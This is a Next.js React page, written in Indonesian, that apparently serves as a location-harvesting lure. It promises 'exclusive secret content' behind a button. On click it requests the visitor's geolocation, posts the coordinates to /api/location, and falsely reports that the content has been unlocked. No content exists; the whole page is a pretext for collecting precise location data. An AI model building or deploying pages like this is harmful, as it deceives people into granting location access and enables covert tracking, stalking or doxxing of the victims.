"use client";

import { useState } from "react";

export default function Home() {
  const [loading, setLoading] = useState(false);

  const sendLocation = () => {
    setLoading(true);

    navigator.geolocation.getCurrentPosition(
      async (pos) => {
        await fetch("/api/location", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            lat: pos.coords.latitude,
            lng: pos.coords.longitude,
          }),
        });

        alert("Konten terbuka 🎉");
        setLoading(false);
      },
      () => {
        alert("Izinkan lokasi untuk melanjutkan");
        setLoading(false);
      }
    );
  };

  return (
    <main style={{
      height: "100vh",
      display: "flex",
      justifyContent: "center",
      alignItems: "center",
      background: "linear-gradient(135deg, #667eea, #764ba2)",
      color: "white",
      textAlign: "center"
    }}>
      <div>
        <h1>🔓 Konten Eksklusif</h1>
        <p>Klik untuk membuka konten rahasia</p>

        <button
          onClick={sendLocation}
          style={{
            padding: "15px 25px",
            fontSize: "16px",
            borderRadius: "10px",
            border: "none",
            cursor: "pointer",
            background: "#fff",
            color: "#333",
            marginTop: "20px"
          }}
        >
          {loading ? "Loading..." : "Buka Sekarang"}
        </button>
      </div>
    </main>
  );
}
